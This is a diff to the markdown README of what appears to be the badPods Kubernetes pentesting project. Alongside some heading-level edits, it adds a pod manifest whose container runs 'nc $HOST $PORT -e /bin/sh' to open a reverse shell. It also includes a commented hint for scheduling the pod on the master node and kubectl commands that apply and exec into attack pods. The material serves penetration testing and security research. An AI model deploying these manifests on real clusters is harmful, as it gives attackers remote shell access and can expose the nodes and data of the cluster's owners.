@@ -5,7 +5,7 @@ The pod security policy or admission controller has blocked access to all of the
 
 # Pod Creation
 
-### Create a pod you can exec into
+## Create a pod you can exec into
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -39,7 +39,23 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/n
 kubectl exec -it pod-nothing-allowed -- bash
 ```
 
-### Or, create a reverse shell pod
+## Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-nothing-allowed-revshell
+  labels: 
+    app: nothing-allowed-revshell
+spec:
+  containers:
+  - name: nothing-allowed-revshell
+    image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+```
 [pod-nothing-allowed-revshell.yaml](pod-nothing-allowed-revshell.yaml)
 
 #### Set up listener
